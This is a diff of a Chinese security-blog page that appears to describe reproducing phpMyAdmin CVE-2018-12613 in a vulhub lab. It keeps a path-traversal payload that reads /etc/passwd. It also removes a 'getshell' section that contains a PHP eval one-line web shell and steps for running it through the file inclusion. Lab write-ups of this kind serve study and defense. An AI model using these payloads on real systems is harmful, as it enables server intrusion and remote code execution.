@@ -423,7 +423,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    285
+                    240
                 </div>
                 
 
@@ -463,12 +463,6 @@ docker-compose up -d
 <pre class=" language-bash"><code class="language-bash">?target<span class="token operator">=</span>db_sql.php%253f/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd
 </code></pre>
 <p><code>ps:%25是%的url编码,%3f是?的url编码</code></p>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>在数据库test中新建一个表，表中注入一句话木马</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
-</code></pre>
-<p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512134342919.png" alt="image-20220512134342919"></p>
-<p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512134405848.png" alt="image-20220512134405848"></p>
-<p>然后通过文件包含执行一句话木马</p>
 
                 
             </div>
@@ -728,18 +722,17 @@ docker-compose up -d
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/">
+                <a href="/2022/05/12/Phpmyadmin-Deserialization/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="PhpMyadmin 远程文件包含漏洞(CVE-2018-12613)">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Phpmyadmin scripts/setup.php反序列化漏洞(WooYun-2016-199433)">
                         
-                        <span class="card-title">PhpMyadmin 远程文件包含漏洞(CVE-2018-12613)</span>
+                        <span class="card-title">Phpmyadmin scripts/setup.php反序列化漏洞(WooYun-2016-199433)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -749,9 +742,9 @@ docker-compose up -d
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-12
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -764,7 +757,6 @@ docker-compose up -d
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -784,12 +776,12 @@ docker-compose up -d
                         <span class="chip bg-color">vulhub</span>
                     </a>
                     
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
-                    </a>
-                    
                     <a href="/tags/phpmyadmin/">
                         <span class="chip bg-color">phpmyadmin</span>
+                    </a>
+                    
+                    <a href="/tags/WooYun/">
+                        <span class="chip bg-color">WooYun</span>
                     </a>
                     
                 </div>
